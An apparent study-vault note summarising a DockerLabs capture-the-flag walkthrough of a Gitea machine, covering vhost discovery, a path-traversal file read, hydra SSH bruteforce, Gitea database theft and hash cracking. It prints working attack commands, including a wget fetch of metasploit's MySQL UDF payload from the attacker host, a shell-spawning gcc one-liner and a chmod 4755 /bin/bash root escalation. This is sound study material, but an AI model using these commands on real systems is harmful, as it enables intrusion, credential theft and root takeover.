---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 172.17.0.2
cves: []
tools: [nmap, whatweb, gobuster, curl, hydra, ssh, mysql, wget, john-the-ripper, metasploit]
techniques: [information-gathering, virtual-hosting, source-code-disclosure, path-traversal, ssh-bruteforce, hash-cracking, hardcoded-credentials, mysql-enumeration, mysql-udf-lpe, suid-enumeration]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[nexus]]", "[[internal]]", "[[duque]]"]
---

# Gitea

**Writeup:** [raw writeup](../../writeups/dockerlabs/intermediate/gitea.md)

A four-vhost box where the service identity arrived inside **nmap's fingerprint-strings**, the entire vhost list fell out of **one `grep appUrl`**, and the exploit for port 80 was *read* from the app's own git history — the diff literally comments `# **Vulnerabilidad**: No se valida el path, permitiendo Path Traversal`. A traversal-read wordlist feeds hydra, a rockyou run dies against 50k-iteration PBKDF2 while a login placeholder hands over the working password, and the endgame stacks three MySQL misconfigs (world-writable plugin dir + `EXECUTE` grant + `SONAME` load) into a UDF that `chmod 4755 /bin/bash`es its way to root.

## Path

1. **Recon** — `ping -c 2` + `sudo nmap -p- --open -sS --min-rate 5000 -n -Pn` → **22** (ssh), **80** (http), **3000** (ppp). The version pass (`-p22,80,3000 -sS -sCV -T4`) fills in **OpenSSH 9.6p1 Ubuntu**, **Apache 2.4.58** (`http-title: DaCapoDocs`), and port 3000 as `Golang net/http server` — *unrecognized*:

   ```
   3000/tcp open  http    Golang net/http server
   |_http-title: Gitea: Git with a cup of tea
   | fingerprint-strings:
   ...
   |     Set-Cookie: i_like_gitea=397250cd9b38a4c0; Path=/; HttpOnly; SameSite=Lax
   |     <title>Gitea: Git with a cup of tea</title>
   ```

   nmap even prints *"1 service unrecognized despite returning data"* and asks for a service submission — but the identity was already in the output: the `i_like_gitea` cookie and the title **are** the answer. Read `fingerprint-strings` as data, not boilerplate ([[information-gathering]], [[nmap]]).
2. **appUrl as vhost oracle** — one grep on the Gitea homepage names the internal domain:

   ```sh
   curl -s http://172.17.0.2:3000 | grep appUrl
   appUrl: 'http:\/\/admin.s3cr3tdir.dev.gitea.dl\/',
   ```

   From that single string, four hosts go straight into `/etc/hosts` — **no vhost fuzzing at all**:

   ```
   172.17.0.2      admin.s3cr3tdir.dev.gitea.dl s3cr3tdir.dev.gitea.dl dev.gitea.dl gitea.dl
   ```

   Contrast [[internal]], where a 303 redirect *plus* `gobuster vhost` were needed to derive the same class of answer ([[virtual-hosting]]).
3. **Register, then clone everything** — an open registration hands over **3 repos / 2 users** (`designer`, `admin`). All three clones are read *before* any of them is used — they turn out to be one chain:
   - **`designer/giteaInfo`** → `gitea_composed.xml`: volumes `/home/designer/gitea:/data` and `<volume>/opt/"INFO_FILE"</volume>` — the hint that later aims the file read at `/opt/info.txt` — plus sqlite3 at `/data/gitea.db` (the privesc target). And `/home/designer` confirms **designer is a system user**.
   - **`designer/mysql`** → `mysql_composer.xml` with `root:root123` / `designer:designer123` — **both fail later** (`ERROR 1045` for each): stale/decoy config ([[hardcoded-credentials]]).
   - **`designer/myapp`** → `uwsgi.ini` (app lives at `/var/www/gitea.dl/app/`) and the exploit itself, in history:

     ```
     git diff HEAD 4fcdf48692f3dc1201452af62e24dc0a1ea3f6c7
     ...
     +    # **Vulnerabilidad**: No se valida el path, permitiendo Path Traversal
          file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
     ```

     The app's own diff is the vulnerability disclosure — sibling of [[nexus]]'s git-history password ([[source-code-disclosure]]).
4. **Vhost fuzzing → `/download`** — `gobuster dir` (DirBuster medium) across the four hosts: `admin.s3cr3tdir…` maps Gitea's user pages (`admin`, `designer`, `hacker`, plus a **401 on `v2`**), `s3cr3tdir…` is marketing (`tutorials`/`free`/`premium`), `dev.gitea.dl` a large marketing site — all dropped — and on `gitea.dl` the fuzz yields one hit:

   ```
   download             (Status: 302) [Size: 189] [--> /]
   ```

   A 302 to `/` = a required parameter missing. Armed with the parameter name from the diff, aim the endpoint — **absolute paths, no `../` needed** ([[path-traversal]], [[directory-fuzzing]]):

   ```sh
   curl -X GET -s http://gitea.dl/download?filename=/etc/passwd | grep /bin/bash
   root:x:0:0:root:/root:/bin/bash
   designer:x:1001:1001::/home/designer:/bin/bash
   ```

   → user enum for free (**designer**), then the file repo #1 hinted:

   ```sh
   curl -X GET -s http://gitea.dl/download?filename=/opt/info.txt | tr ':' ' ' | awk '{ print $2 }' > pass.txt
   ```

   **50 `userNNN:password` pairs** — the volume entry `/opt/"INFO_FILE"` from `giteaInfo` was the pointer all along: intel from clone #1 aimed the read in repo #3's endpoint ([[source-code-disclosure]]).
5. **SSH** — the traversal handed over both axes of the pair (user from `/etc/passwd`, passwords from the wordlist), so hydra only has to guess the password:

   ```sh
   hydra -l designer -P pass.txt ssh://172.17.0.2 -f -V -t 64
   [22][ssh] host: 172.17.0.2   login: designer   password: SuperSecurePassword123
   ```

   `SuperSecurePassword123` is pair `user018`. SSH in → `cat user.txt` — **flag path only; the value stays in the raw writeup, never transcribed here** (vault policy, cf. [[nexus]], [[vulnvault]]). Same file-read → creds → SSH shape as [[duque]] ([[ssh-bruteforce]], [[hydra]]).
6. **Privesc intel** — the cloned `giteaInfo` already said the DB lives at `/data/gitea.db` and points at mysql; on the box:

   ```sh
   ss -tuln | grep 3306
   tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
   ```

   Config was the compass — topology known before checking. But the repo's creds are dead:

   ```
   ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
   ERROR 1045 (28000): Access denied for user 'designer'@'localhost' (using password: YES)
   ```

   Pivot: **steal Gitea's own DB** (sqlite path from the compose xml) — serve it from the box, pull it from the attacker:

   ```sh
   cd gitea/data/ && python3 -m http.server 5000      # on the box
   wget http://172.17.0.2:5000/gitea.db               # from the attacker — 2 MB sqlite
   sqlite3 gitea.db
   sqlite> select name, passwd, salt, passwd_hash_algo from user;
   ```

   → `admin`, `designer`, `hacker` hashes, all stamped `pbkdf2$50000$50` — **PBKDF2-HMAC-SHA256, 50000 iterations, 50-byte hash** ([[mysql-enumeration]]).
7. **The crack that failed — honestly** — `gitea2john.py` (john repo) + a manual base64-padding cleanup, then:

   ```sh
   john --format=PBKDF2-HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 hashes.txt
   Loaded 1 password hash (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 256/256 AVX2 8x])
   Cost 1 (iteration count) is 50000 for all loaded hashes
   ...
   Session aborted
   ```

   *"couldn't crack the hash"* — 50k iterations per guess is a wall in front of rockyou. The lesson is the **pivot**: dir fuzzing had already found a login panel at `gitea.dl` whose input *placeholder* says `PassAdmin123-`, and that works where rockyou didn't ([[hash-cracking]], [[hardcoded-credentials]]).
8. **MySQL — pre-LPE enumeration** — `mysql -u admin -p` with the placeholder pair is valid, and the three checks that unlock the endgame run before any exploit attempt:

   ```sql
   SHOW GRANTS;        -- SELECT, INSERT, UPDATE, DELETE, EXECUTE ON *.*
   SELECT @@plugin_dir; -- /usr/lib/mysql/plugin/
   ```
   ```sh
   ls -la /usr/lib/mysql/ | grep plugin
   drwxr-xrwx 1 root root 4096 Feb 26  2025 plugin
   ```

   `EXECUTE` (right to create functions) + a **world-writable** plugin dir (write primitive) — two of the three preconditions, in plain sight ([[mysql-enumeration]], [[mysql-udf-lpe]]).
9. **UDF endgame** — two routes are on record. Route (a), a hand-rolled constructor `.so`, was written down and abandoned mid-writeup:

   ```sh
   echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' | gcc -w -fPIC -shared -o /usr/lib/mysql/plugin/lib.so -x c -
   ```

   Route (b) — the one used — serves metasploit's ready-made payload from the attacker and pulls it onto the box:

   ```sh
   cd /usr/share/metasploit-framework/data/exploits/mysql && python3 -m http.server 3000   # attacker
   wget http://172.17.0.1:3000/lib_mysqludf_sys_64.so                                     # box
   mv lib_mysqludf_sys_64.so /usr/lib/mysql/plugin/lib.so                                 # o+rwx makes this legal
   ```
   ```sql
   CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib.so';
   SELECT sys_eval('id');                        -- uid=0(root) gid=0(root)
   SELECT sys_eval('chmod 4755 /bin/bash');      -- grant, not shell
   ```
   ```sh
   /bin/bash -p
   whoami
   root
   ```

   `cat root.txt` — **flag path only, value omitted**. The fourth SUID-bash root in the vault ([[acme]] found one; [[vulnvault]] and [[jenkhack]] created one) — but the first where the grant is written *by a MySQL UDF* ([[mysql-udf-lpe]], [[suid-enumeration]], [[gtfobins]]).

## Credentials / secrets

| Secret | Where it came from |
|--------|--------------------|
| `designer` (system user) | cloned `giteaInfo` volume `/home/designer/gitea:/data` → confirmed by traversal-read `/etc/passwd` |
| `root:root123`, `designer:designer123` | cloned `mysql` repo's `mysql_composer.xml` — **decoys: both fail with `ERROR 1045`** |
| 50 `userNNN:password` pairs (incl. `user018:SuperSecurePassword123`) | traversal-read `/opt/info.txt` — target file hinted by `giteaInfo`'s `/opt/"INFO_FILE"` volume; **only `user018` ever tried** |
| `designer:SuperSecurePassword123` | the `user018` pair → hydra over SSH → user flag (path `user.txt`, value not transcribed) |
| `admin:PassAdmin123-` | login-input **placeholder** on `gitea.dl` → valid MySQL account (never replayed on Gitea or SSH — see gaps) |
| Gitea password hashes (admin/designer/hacker) | stolen `gitea.db` via reversed `http.server` staging → `sqlite3` — `pbkdf2$50000$50`, john session aborted (uncracked) |
| `user.txt`, `root.txt` | flag **paths** only — values exist in the raw writeup and are deliberately never copied here (vault policy) |

## Takeaways

- **The scan already named the service.** Port 3000 was "unrecognized" — nmap even asked you to submit the fingerprint — yet `fingerprint-strings` carried `i_like_gitea` and `<title>Gitea: …</title>` before a single HTTP request was sent. Service identity is *in* the `-sC` output; read strings, not just the `SERVICE VERSION` column ([[information-gathering]], [[nmap]]).
- **The app is a vhost oracle.** One `grep appUrl` replaced all vhost fuzzing: the homepage told you its own internal domain, and four `/etc/hosts` lines followed from one string ([[virtual-hosting]]; cf. [[internal]]'s redirect-plus-fuzz derivation). When a self-hosted app has a base-URL setting, grep it first.
- **Git history discloses vulnerabilities, not just secrets.** The exploit for port 80 was never *found* — it was read: the repo's own diff comments the bug in Spanish above the unsanitized `os.path.join`. `git log`/`git diff` on any cloned app is a disclosure channel ([[source-code-disclosure]], cf [[nexus]]'s git-history password).
- **The three clones are one chain.** Clone #1's `/opt/"INFO_FILE"` volume aimed the traversal read; clone #3's diff disclosed the traversal endpoint; clone #2's topology (a DB, `/data/gitea.db`) framed the privesc — even its *dead* creds told you mysql exists. Read every repo before using any ([[source-code-disclosure]], [[mysql-enumeration]]).
- **Config files are compasses — and they can be stale.** The compose xml had mysql listening on `127.0.0.1:3306` before `ss` ever confirmed it, while its `root123`/`designer123` (and its `mysql:5.7` image — the live server answers `MariaDB [...]`) describe a deployment that isn't the running one. Take topology from config; verify credentials by using them ([[hardcoded-credentials]]).
- **The crack that failed and the page that didn't.** PBKDF2 at 50k iterations vs rockyou is a wall — `Session aborted` — while a form placeholder (`PassAdmin123-`) handed over a working login. Knowing when to *stop* cracking and go look for the credential in plain sight is as much a skill as cracking ([[hash-cracking]], [[hardcoded-credentials]]).
- **A wordlist can be extracted, not found.** `/etc/passwd` named the user, `/opt/info.txt` supplied 50 passwords, and `awk '{print $2}'` turned a file read into `pass.txt` — the file-read → wordlist → hydra pipeline, with both axes of the credential derived by reading, not guessing ([[path-traversal]], [[ssh-bruteforce]]).
- **The UDF endgame = three misconfigs stacked.** World-writable `@@plugin_dir` (write primitive) + `EXECUTE` grant (`CREATE FUNCTION` right) + `SONAME` (loading *your* `.so`) — remove any one and no code runs. UDF abuse is configuration, not a CVE, which is why the grants/plugin-dir/`ls -la` trio in step 8 is the real exploit ([[mysql-udf-lpe]]).
- **Grant, don't shell.** `sys_eval('chmod 4755 /bin/bash')` + `/bin/bash -p` is now the vault's canonical DB-privesc payload — same preserve-euid contract as [[suid-enumeration]]/[[gtfobins]], delivered from inside the database ([[jenkhack]] wrote the same grant through a wrapper).

## Gaps in the writeup

- **The repo's mysql creds are never reconciled with the working pair.** Why did `root123`/`designer123` fail? The cloned compose declares `mysql:5.7` in `mysql-container`, the live server answers `MariaDB [(none)]>`, and `ss` shows `127.0.0.1:3306` — container vs host, old config vs live deployment: which mysql the compose described is never established, and `admin:PassAdmin123-` never meets an explanation either.
- **`Session aborted` is a stop, not a proof.** "Couldn't crack the hash" rests on an *aborted* john session — no potfile, no extended run, no hashcat cross-check. The wall is real (50k iterations × 4 nodes), but "uncrackable" is an inference from a timeout.
- **49 of the 50 password pairs were never tried.** Only `user018` went to hydra; the other49 sat in `pass.txt` unused — no second username, no `su` spray, no Gitea replay.
- **The `hacker` user and the `admin` Gitea session are dropped.** The hash dump lists three accounts; `admin:PassAdmin123-` was tried on *MySQL only* — never at Gitea's `/user/login` and never against SSH. `hacker` is never touched again after appearing in fuzz output and in the sqlite dump.
- **`v2` (401) and `server-status` (403) were never probed.** Both appeared in the admin vhost's fuzz and were written down as dead ends without a single authenticated or re-worded request.
- **Two of four vhosts were fuzzed and forgotten.** `s3cr3tdir.dev.gitea.dl` and `dev.gitea.dl` produced page inventories (`premium.html`, a 123 KB `about.html`, `signup`/`signin`) that were never opened — marketing sites, yes, but unread is unread.
- **The gcc constructor route (route a) was abandoned mid-writeup.** The one-liner that would execute *at load time* is on record but never loaded — so the constructor-vs-`sys_eval` difference is asserted from theory, not demonstrated on this box.
- **The `/opt/info.txt` derivation is the reader's inference.** The XML's `<volume>/opt/"INFO_FILE"</volume>` hint and the eventual `filename=/opt/info.txt` request never meet in the transcript — no line connects hint to payload; the link is reconstructed here.
- **Shell boundaries are unmarked in the staging blocks.** Both `python3 -m http.server` runs look identical in the transcript; only the `wget` IPs separate them (gitea.db pulled from `172.17.0.2`, the `.so` from `172.17.0.1`). Who served which file is inferred, never stated.
- **The final root's namespace is unclear.** `sys_eval('id')` returns `uid=0` — the DB process is root *somewhere* — but whether `cat root.txt` ran on the host or inside a mysql container (the compose promised `mysql-container`) is never shown; neither is the mysql process's actual uid/namespace from the host side.
- **Flags exist in the source** — `user.txt` and `root.txt` were both read in the raw writeup. Paths recorded here; **values deliberately omitted** (vault policy, as on [[nexus]]/[[vulnvault]]).
